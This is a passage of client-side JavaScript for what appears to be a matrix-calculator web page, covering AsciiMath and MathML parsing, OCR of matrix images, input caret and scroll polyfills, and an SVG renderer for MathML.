/*global transformMathML, XMLSerializer, DOMParser */

(function() {
    "use strict";



    //=getMatrix4
    //?
    var getTableFromAsciiMathMatrix = function(input) {
        // return RPN(s).matrix.getElements();
        var rows = [
            []
        ];
        var cellStart = 0;
        var b = 0;
        for (var i = 0; i < input.length; i += 1) {
            var c = input.charCodeAt(i);
            if (c === "{".charCodeAt(0)) {
                b += 1;
                if (b === 2) {
                    cellStart = i + 1;
                }
            } else if (c === "}".charCodeAt(0)) {
                if (b === 2) {
                    rows[rows.length - 1].push(input.slice(cellStart, i));
                } else if (b === 0) {
                    return null;
                }
                b -= 1;
            } else if (c === ",".charCodeAt(0)) {
                if (b === 2) {
                    rows[rows.length - 1].push(input.slice(cellStart, i));
                    cellStart = i + 1;
                } else if (b === 1) {
                    rows.push([]);
                } else if (b === 0) {
                    return null;
                }
            } else if (c === "(".charCodeAt(0)) {
                if (b < 2) {
                    return null;
                }
                b += 1;
            } else if (c === ")".charCodeAt(0)) {
                if (b < 3) {
                    return null;
                }
                b -= 1;
            } else if (/[^\s]/.test(String.fromCharCode(c))) {
                if (b < 2) {
                    return null;
                }
            }
        }
        return rows;
    };

    var serializeMathML = function(element) {
        var mathml = new XMLSerializer().serializeToString(element).replace(/\sxmlns="[^"]+"/g, '');
        mathml = mathml.replace(/[\u2061]/g, '&#x2061;'); // &af; or &ApplyFunction; are not supported when pasting XML into Word
        mathml = '<math xmlns="http://www.w3.org/1998/Math/MathML">' + mathml + '</math>';
        return formatXml(mathml);
    };

    var parseMathML = function(mathml) {
        mathml = mathml.replace(/&[A-Za-z]+;/gi, function(entity) {
            return new DOMParser().parseFromString(entity, "text/html").documentElement.textContent;
        });
        return new DOMParser().parseFromString(mathml, "text/xml").firstChild;
    };

    var mathmlToLaTeX = function(element) {
        return transformMathML(element, "LaTeX").string;
    };

    // TODO: remove "matrix containers" ({useMatrixContainer: false})
    var serializeMatrixContainer = function(matrixContainer) {
        if (matrixContainer.getAttribute('data-matrix') != null && matrixContainer.firstElementChild.nextElementSibling === null) {
            matrixContainer = matrixContainer.firstElementChild;
            matrixContainer = matrixContainer.cloneNode(true);
            // Removal of extra attributes added by "MathML polyfill":
            //TODO: href, draggable, tabindex - ?
            matrixContainer.removeAttribute('style');
            matrixContainer.removeAttribute('class');
            var es = matrixContainer.querySelectorAll('*');
            for (var i = 0; i < es.length; i += 1) {
                es[i].removeAttribute('style'); //TODO: remove
                es[i].removeAttribute('class'); //TODO: remove
            }
        }

        // TODO: https://www.w3.org/TR/clipboard-apis/#writing-to-clipboard
        return serializeMathML(matrixContainer);
    };

    var formatXml = function(xml) {
        // https://stackoverflow.com/questions/376373/pretty-printing-xml-with-javascript
        // Note: /.<\/\w[^>]*>$ is faster than /.+<\/\w[^>]*>$
        var formatted = '';
        var padding = '';
        var nodes = xml.replace(/></g, '>\n<').split('\n');
        for (var i = 0; i < nodes.length; i += 1) {
            var node = nodes[i];
            var indent = '';
            if (!/.<\/\w[^>]*>$/.test(node)) {
                if (/^<\/\w/.test(node)) {
                    padding = padding.slice(0, 0 - '  '.length);
                } else {
                    if (/^<\w[^>]*[^\/]>.*$/.test(node)) {
                        indent = '  ';
                    }
                }
            }
            formatted += padding + node + '\n';
            padding += indent;
        }
        return formatted;
    };

    var getMatrixFromTextBlocks = function(textBlocks) {
        //! no new lines, no spaces

        function splitBlocks(textBlocks, type) {
            function m(text) {
                return type === "rows" ? text.boundingBox.y + text.boundingBox.height / 2 : text.boundingBox.x + text.boundingBox.width / 2;
            }

            function rowMiddle(row) {
                var result = 0;
                for (var j = 0; j < row.length; j += 1) {
                    result = (result * j + m(row[j])) / (j + 1);
                }
                return result;
            }
            var rows = [];
            for (var n = 0; n < textBlocks.length; n += 1) {
                var text = textBlocks[n];
                var middle = m(text);
                var rowIndex = -1;
                for (var i = 0; i < rows.length; i += 1) {
                    var row = rows[i];
                    if (Math.abs((rowMiddle(row) - middle) / (type === "rows" ? text.boundingBox.height : text.boundingBox.width)) < 0.75) {
                        rowIndex = i;
                    }
                }
                if (rowIndex === -1) {
                    rows.push([]);
                    rowIndex = rows.length - 1;
                }
                rows[rowIndex].push(text);
            }
            rows.sort(function(a, b) {
                return rowMiddle(a) - rowMiddle(b);
            });
            return rows;
        }

        textBlocks = textBlocks.filter(function(textBlock) {
            return /[^\(\)\[\]\|]/.test(textBlock.rawValue); //TODO: ?
        });
        var rows = splitBlocks(textBlocks, "rows");
        var cols = splitBlocks(textBlocks, "cols");

        var table = new Array(rows.length);
        for (var i = 0; i < rows.length; i += 1) {
            table[i] = new Array(cols.length);
            for (var j = 0; j < cols.length; j += 1) {
                table[i][j] = '';
            }
        }

        for (var n = 0; n < textBlocks.length; n += 1) {
            var text = textBlocks[n];
            var rowIndex = -1;
            for (var i = 0; i < rows.length; i += 1) {
                if (rows[i].indexOf(text) !== -1) {
                    rowIndex = i;
                }
            }
            var colIndex = -1;
            for (var i = 0; i < cols.length; i += 1) {
                if (cols[i].indexOf(text) !== -1) {
                    colIndex = i;
                }
            }
            table[rowIndex][colIndex] += text.rawValue;
        }

        return table.map(function(x) {
            return x.join(' ');
        }).join('\n');
    };


    var html2html = function(container) {
        var clone = container.cloneNode(true);
        var walk = function(node) {
            if (node.tagName.toLowerCase() === 'script' || node.tagName.toLowerCase() === 'iframe') {
                node.parentNode.removeChild(node);
            } else if (node.tagName.toLowerCase() === 'link') {
                if (node.getAttribute('rel') === 'stylesheet') {
                    node.setAttribute('href', node.href); // set to an absolute URL
                } else {
                    node.parentNode.removeChild(node);
                }
            } else if (node.tagName.toLowerCase() === 'input') {
                node.setAttribute('value', node.value);
            } else if (node.tagName.toLowerCase() === 'textarea') {
                node.textContent = node.value;
            }
            var next = node.firstElementChild;
            while (next != null) {
                var c = next;
                next = next.nextElementSibling; // as c could be removed
                walk(c);
            }
        };
        walk(clone);
        return new XMLSerializer().serializeToString(clone);
    };

    globalThis.sendSnapshot = function() {
        var activeElement = document.querySelector(":focus");
        if (activeElement != null) {
            activeElement.setAttribute("data-state", "focus");
            activeElement.setAttribute("autofocus", "autofocus"); // as huge snapshot may be truncated and style can be cutted out
        }
        var snapshot = html2html(document.documentElement);
        if (activeElement != null) {
            activeElement.removeAttribute("data-state");
            activeElement.removeAttribute("autofocus");
        }
        snapshot += "<style>[data-state=\"focus\"] { outline: 2px solid green; } </style>";
        var dataURL = "data:text/html;charset=utf-8," + snapshot.replace(/%/g, '%25').replace(/#/g, '%23');
        globalThis.onerror(dataURL, "snapshot.js", 0, 0, undefined);
    };

    globalThis.getTableFromAsciiMathMatrix = getTableFromAsciiMathMatrix;
    //globalThis.serializeMathML = serializeMathML;
    globalThis.parseMathML = parseMathML;
    globalThis.formatXml = formatXml;
    //globalThis.toMultilineString = toMultilineString;
    globalThis.mathmlToLaTeX = mathmlToLaTeX;
    globalThis.serializeMatrixContainer = serializeMatrixContainer;
    globalThis.getMatrixFromTextBlocks = getMatrixFromTextBlocks;

    if (typeof TextDetector === 'undefined') {
        globalThis.TextDetector = function() {};
        globalThis.TextDetector.prototype.detect = function(image) {
            var pathPrefix = PageUtils.ROOT_PATH + 'js';
            var worker = null;
            return PageUtils.$import(pathPrefix + '/tesseract.js/tesseract.min.js').then(function() {
                var createWorker = Tesseract.createWorker;
                return createWorker({
                    workerPath: pathPrefix + '/tesseract.js/worker.min.js',
                    langPath: pathPrefix + '/lang-data',
                    corePath: pathPrefix + '/tesseract.js-core/tesseract-core.wasm.js',
                    logger: function(m) {
                        return console.log(m);
                    }
                });
            }).then(function(w) {
                worker = w;
                return worker.load();
            }).then(function() {
                return worker.loadLanguage('digits_comma+eng+equ');
            }).then(function() {
                return worker.initialize('digits_comma+eng+equ');
            }).then(function() {
                var dashes = '-\u2011\u2012\u2013\u2014\u2015\u2212';
                return worker.setParameters({
                    tessedit_char_whitelist: '\t 0123456789.,' + dashes,
                    preserve_interword_spaces: '1',
                    tessedit_pageseg_mode: '11' // PSM.SPARSE_TEXT
                });
            }).then(function() {
                return worker.recognize(image);
            }).then(function(tmp) {
                var data = tmp.data;
                console.log(data);
                var textBlocks = [];
                for (var i = 0; i < data.lines.length; i += 1) {
                    var line = data.lines[i];
                    for (var j = 0; j < line.words.length; j += 1) {
                        var word = line.words[j];
                        textBlocks.push({
                            rawValue: word.text,
                            boundingBox: {
                                x: word.bbox.x0,
                                y: word.bbox.y0,
                                widths: word.bbox.x1 - word.bbox.x0,
                                height: word.bbox.y1 - word.bbox.y0
                            }
                        });
                    }
                }
                return textBlocks;
            });
        };
    }

    globalThis.dndGetTextData = function(dataTransfer, callback) {
        //TODO: MathML support (?)
        // MathML in text
        var text = dataTransfer.getData('text/plain') || '';

        var onSVGReady = function(text) {
            //TODO: svg with errors
            var svg = new DOMParser().parseFromString(text, 'image/svg+xml').firstElementChild;
            document.body.appendChild(svg);
            var textBlocks = [];
            var es = svg.querySelectorAll('text');
            for (var i = 0; i < es.length; i += 1) {
                var text = es[i];
                textBlocks.push({
                    boundingBox: text.getBoundingClientRect(),
                    rawValue: text.textContent
                });
            }
            text = getMatrixFromTextBlocks(textBlocks);
            callback(text);
        };

        // for tests:
        if (/^data\:image\/svg\+xml?,/.test(text)) {
            onSVGReady(decodeURIComponentSafe(text.slice(text.indexOf(',') + 1)));
            return null;
        }

        //!new 2020-04-05
        var files = dataTransfer.files || [];
        if ((typeof TextDetector !== 'undefined' || /^data\:image\/svg\+xml[;,]/.test(text) || files.length === 1 && files[0].type === 'image/svg+xml') &&
            // a file OR a data URL or a link
            ((text === '' && files.length === 1 && files[0].type.indexOf('image/') === 0) || /^data\:image\/\S+\,/.test(text) || /^(ftp|https?)\:\S+/.test(text))) {
            (text.startsWith('data:') || text.startsWith('https:') || text.startsWith('http:') || text.startsWith('ftp:') ? fetch(text, {
                credentials: 'include'
            }).then(function(response) {
                return response.blob();
            }) : Promise.resolve(files[0])).then(function(imageFile) {
                if (imageFile.type === 'image/svg+xml') {
                    imageFile.text().then(onSVGReady);
                } else {
                    var loadImage = function(imageFile) {
                        return new Promise(function(resolve, reject) {
                            var src = URL.createObjectURL(imageFile);
                            var img = new Image();
                            img.onload = function() {
                                //TODO:
                                // tesseract still needs the image URL (?)
                                //URL.revokeObjectURL(url);
                                resolve(img);
                            };
                            img.onerror = function(error) {
                                //TODO:
                                // tesseract still needs the image URL (?)
                                //URL.revokeObjectURL(url);
                                reject(error);
                            };
                            img.src = src;
                        });
                    };
                    // Uncaught (in promise) Error: NotSupportedError: Unsupported source. in Chrome 86 for File
                    loadImage(imageFile).then(function(img) {
                        var textDetector = new TextDetector();
                        textDetector.detect(img).then(function(textBlocks) {
                            if (textBlocks.length === 0) {
                                throw new Error('no text blocks detected');
                            }
                            var text = getMatrixFromTextBlocks(textBlocks);
                            callback(text);
                        })['catch'](function(error) {
                            throw new Error(error);
                        });
                    });
                }
            });
            return null;
        }

        // 1x+2y=0
        // 3x+4y=0

        // {{1,2},{3,4}}

        // 1\t2\t3
        // 4\t5\t6
        // 7\t8\t9
        var mathText = (text || dataTransfer.getData('application/mathml-presentation+xml') || '').trim();
        if (/^<m[a-z]+[^>]*>/.test(mathText) && /<\/m[a-z]+>*$/.test(mathText)) {
            text = transformMathML(parseMathML(mathText), 'AsciiMath').string;
            callback(text);
            return null;
        }

        callback(text);
        return null;
    };

}());

/*global document, window, Element, HTMLInputElement, CSS */

// TODO: Firefox bug, Edge bug
// Firefox 111(latest for now) + ? does not scroll while dragover for <input>
// IE does not scroll while dragover for <input>
if (!("webkitUserDrag" in document.documentElement.style)) { //TODO: proper detection
    var lastScrollLeft = 0;
    document.addEventListener('dragover', function(event) {
        var input = event.target; //document.elementFromPoint(event.clientX, event.clientY);
        if (input.matches('input')) {
            var scrollLeft = input.scrollLeft;
            if (lastScrollLeft === scrollLeft) { // The skip if the web browser has the support of this feature
                var rect = input.getBoundingClientRect();
                var distanceToLeftEdge = event.clientX - rect.left;
                var distanceToRightEdge = input.clientWidth - (event.clientX - rect.left);
                var dx = distanceToLeftEdge < 9 ? -6 : (distanceToRightEdge < 9 ? +6 : 0);
                if (dx + scrollLeft < 0) {
                    dx = -scrollLeft;
                }
                //dx = Math.min(dx, input.scrollWidth - input.clientWidth);
                if (dx !== 0) {
                    input.scrollLeft = scrollLeft + dx; // input.scrollBy() is not supported in Edge 18
                }
            }
            lastScrollLeft = scrollLeft;
        }
    });
}


// Firefox < 20, Chrome, Edge, Opera, Safari
if (document.caretPositionFromPoint == undefined) {

    var createElementLikeInput = function(input, contentCallback, callback) {
        "use strict";
        var inputStyle = window.getComputedStyle(input, undefined);

        var scrollLeft = input.scrollLeft;
        var scrollTop = input.scrollTop;

        var inputRect = input.getBoundingClientRect();

        var div = document.createElement("div");
        contentCallback(div);
        div.style.position = "absolute";
        div.style.display = "inline-block";

        div.style.margin = "0px";
        div.style.border = "0px solid transparent";

        div.style.paddingLeft = inputStyle.paddingLeft;
        div.style.paddingRight = inputStyle.paddingRight;
        div.style.paddingTop = inputStyle.paddingTop;
        div.style.paddingBottom = inputStyle.paddingBottom;

        div.style.left = (inputRect.left + window.pageXOffset + input.clientLeft).toString() + "px";
        div.style.top = (inputRect.top + window.pageYOffset + input.clientTop).toString() + "px";
        div.style.width = input.clientWidth.toString() + "px";
        div.style.height = input.clientHeight.toString() + "px";

        if ("boxSizing" in div.style) {
            div.style.boxSizing = "border-box";
        }
        if ("MozBoxSizing" in div.style) {
            div.style.MozBoxSizing = "border-box";
        }
        if ("webkitBoxSizing" in div.style) {
            div.style.webkitBoxSizing = "border-box";
        }

        div.style.whiteSpace = input.tagName.toLowerCase() === 'input' ? 'nowrap' : 'pre';
        div.style.wordWrap = inputStyle.wordWrap;

        // Firefox does not like font
        div.style.fontSize = inputStyle.fontSize;
        div.style.fontFamily = inputStyle.fontFamily;
        div.style.overflow = "hidden";
        div.style.visibility = "visible"; // Opera 12 needs visible
        div.style.zIndex = "100000"; //?

        document.body.appendChild(div);
        div.scrollLeft = scrollLeft;
        div.scrollTop = scrollTop;
        var result = callback(div);
        div.parentNode.removeChild(div);
        return result;
    };

    document.caretPositionFromPoint = function(x, y) {
        "use strict";
        var element = document.elementFromPoint(x, y);
        if (element.tagName.toLowerCase() !== 'input' &&
            element.tagName.toLowerCase() !== 'textarea') {
            var caretRange = document.caretRangeFromPoint(x, y);
            return {
                offsetNode: caretRange.startContainer,
                offset: caretRange.startOffset
            };
        }
        var input = element;
        var offset = createElementLikeInput(input, function(div) {
            var value = input.value.replace(/\r\n/g, "\n") + "\n"; // IE - \r\n
            div.textContent = value;
        }, function() {
            return document.caretRangeFromPoint(x, y).startOffset;
        });
        return {
            offsetNode: input,
            offset: offset
        };
    };

    var hasSetSelectionRangeScrollToVisibilityBug = function(callback) {
        var input = document.createElement('input');
        input.style.position = 'fixed';
        input.style.left = '-20px';
        input.style.top = '-2em';
        input.style.width = '10px';
        input.style.height = '1em';
        input.style.opacity = '0';
        input.style.overflow = 'hidden';
        input.value = 'x'.repeat(1000);
        document.documentElement.appendChild(input);
        window.requestAnimationFrame(function() {
            var activeElement = document.activeElement;
            input.focus();
            input.scrollLeft = 0;
            input.setSelectionRange(999, 1000);
            if (activeElement != null) {
                activeElement.focus();
            } else {
                input.blur();
            }
            window.setTimeout(function() {
                var ok = input.scrollLeft !== 0;
                callback(!ok);
                window.requestIdleCallback(function() {
                    window.requestAnimationFrame(function() {
                        input.parentNode.removeChild(input);
                    });
                });
            }, 1000);
        });
    };

    // Chrome 80
    // https://bugs.chromium.org/p/chromium/issues/detail?id=331233
    if (HTMLInputElement.prototype.createTextRange == null &&
        HTMLInputElement.prototype.setSelectionRange != null) {
        hasSetSelectionRangeScrollToVisibilityBug(function() {
            // Range.prototype.getBoundingClientRect is null in Opera Mini
            // Range.prototype.getBoundingClientRect isnull in Firefox < 4
            // Range#getBoundingClientRect returns null on Android 4.4
            var nativeSetSelectionRange = HTMLInputElement.prototype.setSelectionRange;
            HTMLInputElement.prototype.setSelectionRange = function(selectionStart, selectionEnd) {
                "use strict";
                nativeSetSelectionRange.call(this, selectionStart, selectionEnd);
                //var position = selectionstart;
                var input = this;
                var result = createElementLikeInput(input, function(div) {
                    var span1 = document.createElement('span');
                    span1.textContent = input.value.slice(0, input.selectionStart);
                    div.appendChild(span1);
                    var span2 = document.createElement('span');
                    span2.textContent = input.value.slice(input.selectionStart, input.selectionEnd);
                    div.appendChild(span2);
                    var span3 = document.createElement('span');
                    span3.textContent = input.value.slice(input.selectionEnd);
                    div.appendChild(span3);
                }, function(div) {
                    var rect = div.firstElementChild.nextElementSibling.getBoundingClientRect();
                    var inputClientRect = div.getBoundingClientRect();
                    return {
                        scrollLeft: rect.right - inputClientRect.right,
                        scrollTop: rect.bottom - inputClientRect.bottom
                    };
                });
                input.scrollLeft += result.scrollLeft;
                input.scrollTop += result.scrollTop;
            };
        });
    }

}

(function() {
    // as the "scroll" event is not supported in Chrome
    // UPDATE: it is supported in Chrome 113 somehow (?)
    // not supported in Safari 16.1
    // https://github.com/w3c/csswg-drafts/issues/4376
    var isScrollEventSupported = function(callback) {
        var input = document.createElement('input');
        input.style.position = 'fixed';
        input.style.left = '0px';
        input.style.top = '0px';
        input.style.width = '32px';
        input.style.height = '32px';
        input.style.opacity = '0';
        input.style.overflow = 'hidden';
        var c = 0;
        input.addEventListener('scroll', function(event) {
            c += 1;
        }, false);
        (document.documentElement || document.body).appendChild(input);
        input.value = 'x'.repeat(1000);
        //input.setSelectionRange(input.value.length, input.value.length);
        input.scrollLeft = 10000;
        // double rAF to be able to get some delayed scroll events (?)
        window.requestAnimationFrame(function() {
            window.requestAnimationFrame(function() {
                window.requestIdleCallback(function() {
                    window.requestAnimationFrame(function() {
                        input.parentNode.removeChild(input);
                    });
                });
                var scrollEventSupport = c !== 0;
                callback(scrollEventSupport);
            });
        });
    };
    var polyfillScrollEventOnInput = function() {
        var lastScrollLeft = -1;
        var lastInput = null;
        var f = function(event) {
            if (event.target != null && event.target.tagName.toLowerCase() === 'input') {
                var input = event.target;
                if (lastInput !== input) {
                    lastScrollLeft = -1;
                }
                lastInput = input;
                var scrollLeft = input.scrollLeft;
                if (scrollLeft !== lastScrollLeft) {
                    lastScrollLeft = scrollLeft;
                    var scrollEvent = document.createEvent("Event");
                    scrollEvent.initEvent("scroll", false, false);
                    input.dispatchEvent(scrollEvent);
                }
            }
        };
        // wheel : Shift + mousewheel
        // dragover : https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
        var events = ['keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove', 'touchmove', 'input', 'focus', 'blur', 'wheel', 'dragover'];
        for (var i = 0; i < events.length; i += 1) {
            document.addEventListener(events[i], f, events[i] === 'wheel' || events[i] === 'touchmove' ? {
                passive: true
            } : true);
        }
    };
    isScrollEventSupported(function(supported) {
        if (!supported) {
            polyfillScrollEventOnInput();
        }
    });
}());

/*global document*/

(function() {
    "use strict";

    function round(v) {
        return (Math.floor(Math.pow(10, 6) * v + 0.5) / Math.pow(10, 6)).toString();
    }

    // see https://github.com/gliffy/canvas2svg/blob/master/canvas2svg.js
    // canvas like API
    function SVGRenderingContext2D(svg) {
        // public
        this.font = "normal 10px sans-serif";
        this.textBaseline = "alphabetic";
        this.textAlign = "start";
        // private
        this.svg = svg;
        this.svg.setAttribute("font-size", "16"); //?
        this.svg.setAttribute("text-anchor", "middle");
        this.svg.setAttribute("fill", "currentColor");
        this.x = 0;
        this.y = 0;
        this.sx = 1;
        this.sy = 1;
        this.px = 0;
        this.py = 0;
    }
    SVGRenderingContext2D.prototype.translate = function(dx, dy) {
        this.x += dx;
        this.y += dy;
    };
    SVGRenderingContext2D.prototype.scale = function(sx, sy) {
        this.sx *= sx;
        this.sy *= sy;
        this.x /= sx;
        this.y /= sy;
    };
    SVGRenderingContext2D.prototype.fillText = function(text, dx, dy) {
        if (this.textBaseline !== "middle" || this.textAlign !== "center") {
            throw new RangeError();
        }
        var match = /^(italic|normal)\s+(normal|bold|\d+)?\s+(\d+(?:\.\d+)?)px\s(serif)$/.exec(this.font);
        if (match == null) {
            throw new RangeError();
        }
        var fontStyle = match[1];
        var fontWeight = match[2] || "normal";
        var fontSize = Number.parseFloat(match[3]);
        var e = document.createElementNS("http://www.w3.org/2000/svg", "text");
        e.setAttribute("x", round(this.x + dx));
        e.setAttribute("y", round(this.y + dy));
        if (round(this.sx) !== round(1) || round(this.sy) !== round(1)) {
            e.setAttribute("transform", "scale(" + round(this.sx) + ", " + round(this.sy) + ")");
            //e.setAttribute("dominant-baseline", "middle");//!TODO: FIX!
        }
        if (fontStyle !== "normal") {
            e.setAttribute("font-style", fontStyle);
        }
        if (fontWeight !== "normal" && fontWeight !== "400") {
            e.setAttribute("font-weight", fontWeight);
        }
        if (fontSize !== 16) {
            e.setAttribute("font-size", round(fontSize));
        }
        e.setAttribute("dy", "0.25em"); //TODO: FIX
        //e.setAttribute("text-anchor", "middle");
        //e.setAttribute("dominant-baseline", "central");
        // not supported in Opera, in Edge, in IE, in Safari (no "text-after-edge")
        //e.setAttribute("dominant-baseline", "text-after-edge");
        e.textContent = text;
        this.svg.appendChild(e);
    };

    SVGRenderingContext2D.prototype.measureText = function(text) {
        // TODO: performance
        // http://wilsonpage.co.uk/introducing-layout-boundaries/
        var tmp = document.getElementById("measure-text-element");
        if (tmp == null) {
            tmp = document.createElement("div");
            tmp.id = "measure-text-element";
            tmp.style.position = "fixed";
            tmp.style.top = "0px"; // affects layout root in Chrome
            tmp.style.left = "0px"; // affects layout root in Chrome
            tmp.style.whiteSpace = "nowrap";
            tmp.style.width = "0px";
            tmp.style.height = "0px";
            tmp.style.overflow = "hidden";
            tmp.style.visibility = "hidden";
            tmp.style.contain = "strict"; //TODO: ?
            var span = document.createElement("span");
            span.style.font = "normal 16px serif";
            span.textContent = " ";
            tmp.appendChild(span);
            document.body.appendChild(tmp);
        }
        var span = tmp.querySelector("span");
        span.style.font = this.font;
        span.firstChild.textContent = text; //Note: on the TextNode
        var rect = span.getBoundingClientRect();
        var width = rect.right - rect.left;
        //tmp.parentNode.removeChild(tmp);
        return {
            width: width
        };
    };

    SVGRenderingContext2D.prototype.beginPath = function() {};
    SVGRenderingContext2D.prototype.moveTo = function(x, y) {
        this.px = x;
        this.py = y;
    };
    SVGRenderingContext2D.prototype.lineTo = function(x, y) {
        var e = document.createElementNS("http://www.w3.org/2000/svg", "line");
        e.setAttribute("x1", round(this.x + this.px));
        e.setAttribute("y1", round(this.y + this.py));
        e.setAttribute("x2", round(this.x + x));
        e.setAttribute("y2", round(this.y + y));
        e.setAttribute("stroke", "currentColor");
        this.svg.appendChild(e);
    };
    SVGRenderingContext2D.prototype.ellipse = function(cx, cy, rx, ry) {
        var e = document.createElementNS("http://www.w3.org/2000/svg", "ellipse");
        e.setAttribute("cx", round(this.x + cx));
        e.setAttribute("cy", round(this.y + cy));
        e.setAttribute("rx", round(rx));
        e.setAttribute("ry", round(ry));
        e.setAttribute("stroke", "currentColor");
        e.setAttribute("fill", "none");
        this.svg.appendChild(e);
    };
    SVGRenderingContext2D.prototype.stroke = function() {};

    globalThis.SVGRenderingContext2D = SVGRenderingContext2D;

}());

/*global SVGRenderingContext2D, console, document, XMLSerializer*/

(function() {
    "use strict";

    // see https://github.com/ForbesLindesay-Unmaintained/mathml-to-svg/pulls
    function MathMLToSVG() {}

    MathMLToSVG.getFontSize = function(scriptlevel) {
        return Math.floor(16 * Math.pow(0.8, scriptlevel) + 0.5);
    };

    MathMLToSVG.makeFont = function(fontStyle, node, fontSize) {
        var fontWeight = window.getComputedStyle(node, null).fontWeight;
        return fontStyle + " " + fontWeight + " " + fontSize + "px" + " " + "serif";
    };

    MathMLToSVG.measure = function(context, node, scriptlevel) {
        var tagName = node.tagName.toLowerCase();
        var f = MathMLToSVG[tagName];
        if (f == null) {
            console.warn(tagName);
            f = MathMLToSVG["mrow"];
        }
        return f(context, node, scriptlevel);
    };

    var MI_MN_MO_MTEXT = function(context, node, scriptlevel) {
        var text = node.textContent.replace(/^\s+|\s+$/g, "");
        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var font = MathMLToSVG.makeFont(node.tagName.toLowerCase() === "mi" && node.textContent.length === 1 ? "italic" : "normal", node, fontSize);
        context.font = font;
        var textWidth = context.measureText(text).width;
        var lspace = 0;
        var rspace = 0;
        // MathML3 spec has "Operator dictionary entries" with lspace+rspace table
        if (node.tagName.toLowerCase() === "mo") {
            var c = text;
            if (c === '\u2061' || c === '\u2062' || c === '\u2063' ||
                c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
                node.nextElementSibling == null || node.previousElementSibling == null ||
                c === ',') {
                lspace = 0;
                rspace = 0;
            } else if (c === "\u00D7" || c === "+") {
                lspace = 4;
                rspace = 4;
            } else {
                lspace = 4;
                rspace = 4;
                console.warn(c);
            }
            //if (c === "\u2212" || c === "~") {
            //  space = 0;
            //}
            if (node.getAttribute("lspace") != null) {
                lspace = Number.parseFloat(node.getAttribute("lspace"));
            }
            if (node.getAttribute("rspace") != null) {
                rspace = Number.parseFloat(node.getAttribute("rspace"));
            }
        }
        lspace = fontSize * lspace / 18;
        rspace = fontSize * rspace / 18;
        return {
            baseline: 0,
            width: lspace + textWidth + rspace,
            height: fontSize,
            render: function() {
                context.translate(lspace, 0);
                context.font = font;
                context.textBaseline = "middle";
                context.textAlign = "center";
                context.fillText(text, textWidth / 2, fontSize / 2);
                context.translate(-lspace, 0);
            }
        };
    };

    MathMLToSVG.mi = MI_MN_MO_MTEXT;
    MathMLToSVG.mn = MI_MN_MO_MTEXT;
    MathMLToSVG.mo = MI_MN_MO_MTEXT;
    MathMLToSVG.mtext = MI_MN_MO_MTEXT;

    MathMLToSVG.mtable = function(context, node, scriptlevel) {
        var sizesByRow = [];
        for (var row = node.firstElementChild; row != null; row = row.nextElementSibling) {
            if (row.tagName.toLowerCase() === "mtr") {
                var rowCellSizes = [];
                for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
                    if (cell.tagName.toLowerCase() === "mtd") {
                        var sizes = MathMLToSVG.measure(context, cell, scriptlevel);
                        rowCellSizes.push(sizes);
                    }
                }
                sizesByRow.push(rowCellSizes);
            }
        }
        var rows = sizesByRow.length;
        var cols = 0;
        for (var i = 0; i < rows; i += 1) {
            cols = Math.max(cols, sizesByRow[i].length);
        }

        var columnlines = (node.getAttribute("columnlines") || "none").split(" ");
        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var columnspacing = Number.parseFloat(node.getAttribute("columnspacing") || "0.8em") * fontSize;
        var rowBaselines = [];
        for (var i = 0; i < rows; i += 1) {
            rowBaselines.push(0);
        }
        var rowHeights = [];
        for (var i = 0; i < rows; i += 1) {
            rowHeights.push(0);
        }
        var columnWidths = [];
        for (var i = 0; i < cols; i += 1) {
            columnWidths.push(0);
        }
        for (var i = 0; i < rows; i += 1) {
            var row = sizesByRow[i];
            var largestHeightAboveBaseline = 0;
            for (var j = 0; j < row.length; j += 1) {
                var sizes = row[j];
                largestHeightAboveBaseline = Math.max(largestHeightAboveBaseline, sizes.height - sizes.baseline);
            }
            for (var j = 0; j < row.length; j += 1) {
                var sizes = row[j];
                rowHeights[i] = Math.max(rowHeights[i], largestHeightAboveBaseline + sizes.baseline);
                columnWidths[j] = Math.max(columnWidths[j], sizes.width + columnspacing);
            }
            rowBaselines[i] = largestHeightAboveBaseline;
        }

        var height = 0;
        for (var i = 0; i < rowHeights.length; i += 1) {
            height += rowHeights[i];
        }
        var width = 0;
        for (var i = 0; i < columnWidths.length; i += 1) {
            width += columnWidths[i];
            width += columnlines[i % columnlines.length] === "none" ? 0 : 1;
        }

        return {
            baseline: height / 2 - fontSize / 2,
            width: width,
            height: height,
            render: function() {

                var y = 0;
                for (var i = 0; i < sizesByRow.length; i += 1) {
                    var row = sizesByRow[i];
                    var x = 0;
                    for (var j = 0; j < row.length; j += 1) {
                        var sizes = row[j];

                        var ax = (columnWidths[j] - sizes.width) / 2;
                        var ay = rowBaselines[i] - (sizes.height - sizes.baseline); // rowalign="baseline"

                        context.translate(x + ax, y + ay);
                        sizes.render();
                        context.translate(-x - ax, -y - ay);

                        x += columnWidths[j];
                        var cl = columnlines[j % columnlines.length];
                        if (cl !== "none") {
                            context.beginPath();
                            context.moveTo(x, y);
                            context.lineTo(x, y + rowHeights[i]);
                            context.stroke();
                            x += 1;
                        }
                    }
                    y += rowHeights[i];
                }
            }
        };
    };

    //TODO: REMOVE
    MathMLToSVG.mfenced = function(context, node, scriptlevel) {
        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var font = MathMLToSVG.makeFont("normal", node, fontSize);
        var measureFence = function(font, text) {
            context.font = font;
            return context.measureText(text).width;
        };
        var drawFence = function(font, text, textWidth, scaleX, scaleY, fontSize) {
            context.scale(scaleX, scaleY);
            context.font = font;
            context.textBaseline = "middle";
            context.textAlign = "center";
            context.fillText(text, textWidth / 2, fontSize / 2);
            context.scale(1 / scaleX, 1 / scaleY);
        };
        var open = node.getAttribute("open") || "(";
        var close = node.getAttribute("close") || ")";
        var child = node.firstElementChild;
        var sizes = MathMLToSVG.measure(context, child, scriptlevel);
        var openWidth = measureFence(font, open);
        var closeWidth = measureFence(font, close);
        var scaleY = sizes.height / fontSize;
        var scaleX = Math.sqrt(Math.sqrt(scaleY));
        return {
            baseline: sizes.baseline,
            width: openWidth + sizes.width + closeWidth + (scaleX - 1) * openWidth + (scaleX - 1) * closeWidth,
            height: sizes.height,
            render: function() {
                drawFence(font, open, openWidth, scaleX, scaleY, fontSize);
                context.translate(openWidth * scaleX, 0);
                sizes.render();
                context.translate(sizes.width, 0);
                drawFence(font, close, closeWidth, scaleX, scaleY, fontSize);
